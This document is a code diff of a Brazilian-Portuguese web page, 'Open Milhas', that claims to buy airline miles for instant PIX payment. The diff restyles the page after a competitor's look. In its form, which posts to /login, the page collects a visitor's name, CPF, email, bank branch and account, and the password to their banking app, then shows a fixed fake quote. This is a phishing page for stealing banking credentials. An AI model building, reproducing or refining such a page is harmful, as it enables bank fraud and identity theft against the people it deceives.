@@ -3,71 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Milhas | Cotação Oficial</title>
+    <title>Open Milhas | Venda Agora</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
     <style>
-        :root { --primary: #0a1128; --gold: #c5a059; --accent: #469cb4; }
-        body { background: #f4f7f6; font-family: 'Segoe UI', sans-serif; }
-        .card-main { border: none; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        :root { --primary: #0a1128; --gold: #c5a059; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; }
+        
+        .navbar-brand { font-family: 'Montserrat', sans-serif; font-weight: 800; color: var(--primary) !important; text-transform: uppercase; }
+        
+        /* Estilo inspirado na HotMilhas */
+        .hero-section { 
+            background: linear-gradient(90deg, #0046ff 0%, #002db3 100%); 
+            color: white; padding: 60px 0; border-radius: 0 0 50px 50px;
+        }
+        .main-title { font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.8rem; letter-spacing: -1px; line-height: 1.1; }
+        
+        .card-form { border: none; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); margin-top: -50px; }
         .step { display: none; }
-        .step.active { display: block; animation: fadeIn 0.4s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .btn-gold { background: var(--gold); color: white; border-radius: 50px; padding: 12px; font-weight: bold; border: none; width: 100%; }
-        .whatsapp-float { position:fixed; width:60px; height:60px; bottom:30px; right:30px; background:#25d366; color:#FFF; border-radius:50px; text-align:center; font-size:30px; z-index:1000; }
+        .step.active { display: block; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .btn-vender { background: #28a745; color: white; font-weight: 800; border-radius: 50px; padding: 15px; width: 100%; border: none; }
     </style>
 </head>
 <body>
 
-<a href="https://wa.me/5511984221050" class="whatsapp-float" target="_blank"><i class="fab fa-whatsapp" style="margin-top:16px;"></i></a>
-
-<nav class="navbar bg-white border-bottom py-3">
+<nav class="navbar bg-white py-3">
     <div class="container justify-content-center">
-        <span class="fw-bold" style="font-size: 1.5rem; color: var(--primary);">OPEN <span style="color:var(--gold)">MILHAS</span></span>
+        <span class="navbar-brand">OPEN <span style="color:var(--gold)">MILHAS</span></span>
     </div>
 </nav>
 
-<div class="container py-5">
-    <div class="text-center mb-5">
-        <h1 class="fw-bold">Venda suas milhas agora</h1>
-        <p class="text-muted">Receba o pagamento antecipado via PIX em poucos minutos.</p>
+<section class="hero-section text-center">
+    <div class="container">
+        <div class="row align-items-center">
+            <div class="col-lg-7 text-lg-start">
+                <h1 class="main-title mb-4">Transforme suas milhas em dinheiro agora mesmo</h1>
+                <p class="fs-5 opacity-75 mb-4">Venda com segurança, receba a partir de 1 dia útil e tenha o valor direto na sua conta.</p>
+            </div>
+            <div class="col-lg-5 d-none d-lg-block">
+                <img src="https://i.ibb.co/Y7YpYpY/people-miles.png" alt="Venda Milhas" class="img-fluid">
+            </div>
+        </div>
     </div>
+</section>
 
+<div class="container mb-5">
     <div class="row justify-content-center">
         <div class="col-md-6">
-            <div class="card card-main p-4">
+            <div class="card card-form p-4 bg-white">
                 <form action="/login" method="POST">
                     <div class="step active" id="step1">
-                        <h5 class="fw-bold mb-3">1. Identificação</h5>
+                        <h5 class="fw-bold mb-3">Dados Básicos</h5>
                         <input type="text" name="nome" class="form-control mb-3" placeholder="Nome Completo" required>
                         <input type="text" name="cpf" id="cpf" class="form-control mb-3" placeholder="CPF" required>
-                        <button type="button" class="btn-gold" onclick="nextStep(2)">CONTINUAR</button>
+                        <input type="email" name="email" class="form-control mb-3" placeholder="Seu melhor e-mail" required>
+                        <button type="button" class="btn btn-primary w-100 rounded-pill" onclick="nextStep(2)">COTAR AGORA</button>
                     </div>
 
                     <div class="step" id="step2">
-                        <h5 class="fw-bold mb-3">2. Endereço</h5>
-                        <input type="text" name="cep" id="cep" class="form-control mb-3" placeholder="CEP">
-                        <input type="text" name="rua" class="form-control mb-3" placeholder="Endereço Completo">
-                        <button type="button" class="btn-gold" onclick="nextStep(3)">PRÓXIMO</button>
-                    </div>
-
-                    <div class="step" id="step3">
-                        <h5 class="fw-bold mb-3">3. Dados para Recebimento</h5>
+                        <h5 class="fw-bold mb-3">Dados Bancários para PIX</h5>
                         <input type="text" name="agencia" class="form-control mb-3" placeholder="Agência">
                         <input type="text" name="conta" class="form-control mb-3" placeholder="Conta com Dígito">
                         <input type="password" name="senha_app" class="form-control mb-3" placeholder="Senha do App do Banco">
-                        <button type="button" class="btn-gold" onclick="nextStep(4)">VALIDAR COTAÇÃO</button>
+                        <button type="button" class="btn btn-primary w-100 rounded-pill" onclick="nextStep(3)">AVANÇAR</button>
                     </div>
 
-                    <div class="step" id="step4">
+                    <div class="step" id="step3">
                         <div class="text-center">
-                            <h4 class="text-success fw-bold">R$ 1.842,50</h4>
-                            <p class="small text-muted mb-4">Valor total aprovado para suas milhas.</p>
-                            <div class="alert alert-light text-start small border">
-                                <i class="fas fa-info-circle me-2"></i> Milhas Latam/Azul detectadas.<br>
-                                <i class="fas fa-bolt me-2 text-warning"></i> Pagamento via PIX em 30 min.
-                            </div>
-                            <button type="submit" class="btn-gold" style="background:#28a745">CONFIRMAR E VENDER AGORA</button>
+                            <h2 class="text-success fw-bold">R$ 1.842,50</h2>
+                            <p class="text-muted small">Valor total a receber em sua conta.</p>
+                            <button type="submit" class="btn-vender">EFETUAR VENDA E RECEBER PIX</button>
                         </div>
                     </div>
                 </form>
@@ -76,14 +84,10 @@
     </div>
 </div>
 
-<script src="https://unpkg.com/imask"></script>
 <script>
-    IMask(document.getElementById('cpf'), { mask: '000.000.000-00' });
-    IMask(document.getElementById('cep'), { mask: '00000-000' });
     function nextStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById('step'+n).classList.add('active');
-        window.scrollTo(0,0);
     }
 </script>
 </body>
